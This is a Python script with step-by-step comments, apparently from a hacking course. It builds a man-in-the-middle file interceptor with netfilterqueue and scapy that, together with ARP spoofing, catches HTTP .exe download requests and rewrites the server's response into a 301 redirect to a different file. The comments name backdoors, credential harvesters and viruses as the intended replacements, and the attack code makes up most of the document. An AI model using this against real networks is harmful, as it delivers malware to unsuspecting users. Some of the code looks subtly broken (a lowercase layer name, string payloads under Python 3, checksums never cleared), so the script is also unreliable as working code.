#In file interceptor - we will modify data in the http layer
#We will intercept - When user tries to download a file and replace it with another file which could be harmful
# File Could be a) backdoor b) Credential Harvester c) Virus
# We will use a combination of ARP spoofing program and File Interceptor to achieve this


# Goal of this program is to write a program that can detect when a user requests to download a certain file
# Upon detecting that file request, we will serve a different file
# TO achieve the same we will take the DNS spoof code which we wrote last section and remove certain lines


#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

#1
# In this program first we will check if packet has http layer
# if a packet contains http layer with useful data, it will contain in the raw layer
# Thus how scapy works is : it has main layers which are IP, TCP, UDP and
# finally at the end, it appends the raw data such as http data in the raw layer
# to check if a packet contains this layer, all we have to do is just type raw instead of DNS

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # 1
    # In this program first we will check if packet has http layer
    # if a packet contains http layer with useful data, it will contain in the raw layer
    # Thus how scapy works is : it has main layers which are IP, TCP, UDP and
    # finally at the end, it appends the raw data such as http data in the raw layer
    # to check if a packet contains this layer, all we have to do is just type raw instead of DNS

#2 Now we dont know, which packets are requests and which packets are responses
# -> Using sport and dport of tcp layer we can find whether it is request or response
#   request:
#   ####[ Raw  ]###
#     dport = http
#     load = GET /HTTP/1.1
#     ....
#     Response:
#     under tcp :
#     sport = http
# ####[ Raw  ]###
# load = HTTP/1.1 301 Moved Permanently
# .....

# 5. we can use a simple if statement in our cdoe and say if dport is 80 then it is request
#     and it is a packet leaving our computer to the destination of
#     port 80 ,hence it is a request and if sport is 80 means it is a http response
# if scapy_packet.haslayer(scapy.Raw):
#     if scapy_packet[scapy.TCP].dport == 80:
#         print("HTTP Request")
#         print(scapy_packet.show())
#     elif scapy_packet[scapy.TCP].sport == 80:
#         print("HTTP response")
#         print(scapy_packet.show())

# 6 Now we have a program which filters http requests and responses. Lets
# use it to analyze and see what happens when a user clicks on a download link and see
# how we can use this information to hijack the download and serve the user
# any other file we want

    # if ".exe" in scapy_packet[scapy.raw].load:
    #     print("[+] exe request")
    #     print(scapy_packet.show())

# 7 Before manually initiating  a http request, we need to establish a tcp handshake and then you
# can server the target other files you want
#     We can wait for the response and modify this response
#     By this way, handsake has already been established and thereafter we
#     can modify it without creating or establishing a new handshake

# 8 So far our program is able to intercept downloads of a specific file
# type. Now we will modify the response so that when target requests to download a specific file type,
# we will serve them a completely different file
#
# In request if we see there will be ack,
# ack = 175361025
#
# Similarly in response we can see seq in tcp layer which is of same value
# of ack which is received in the request
# seq = 175361025
# We can use the same mechanism to check if the response corresponds to this request

# 9 to do that, we will create a list ack_list and in process_packet
# function i will append my ack_list
#     ack_list.append(scapy_packet[scapy.TCP].ack)
# So every time the request contains TCP with ack, ack_list will be appended
# Then in the elif we will make check if seq is contained in the ack_list then
# that means that this is a response to a request that was captured in the if statement
#     if scapy_packet[scapy.TCP].seq in ack_list:
#         print("[+] Replacing file we want to download"

# 9 Since we have detected the ack and seq in the ack_list, we need to remove the
# ack from the ack_list

# 10
# Next step: We will analyse the response and see how to modify it
# In TCP -> we know that path where http data will be stored in raw is the load
# #########[Raw] ###
#     load = HTTP/1.1 200 OK\r\nServer: Apache\r\nETag

    # Here 200 OK is the HTTP status code

# To alter we can use the http status code for Redirection: 3xx, Redirection
# allows us to redirect the request to somewhere else
# If client requests something from a certain website we can use 300 status code
# We will be using 301 - Moved permanently status code

# Example for 301 status code
# Client request:
#
# GET /index.php HTTP/1.1
# Host: www.example.org
# Server response:
#
# HTTP/1.1 301 Moved Permanently
# Location: https://www.example.org/index.asp
#

# 11 So basically i have change my load in http response from 201 ok to 301 moved Permanently
#      scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe"

# 12 Now we changed the content for download. But like we did in dns spoofing , we need to remove the length field, checksum in the IP and
#     Checksum in TCP layer . Reason for this change is - We modified the packet so the values in here would change
#     Hence we need to update length and checksum accordingly

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport ==80:
            print("HTTP response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file we want to download")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe"
            print(scapy_packet.show())



    packet.accept()



queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
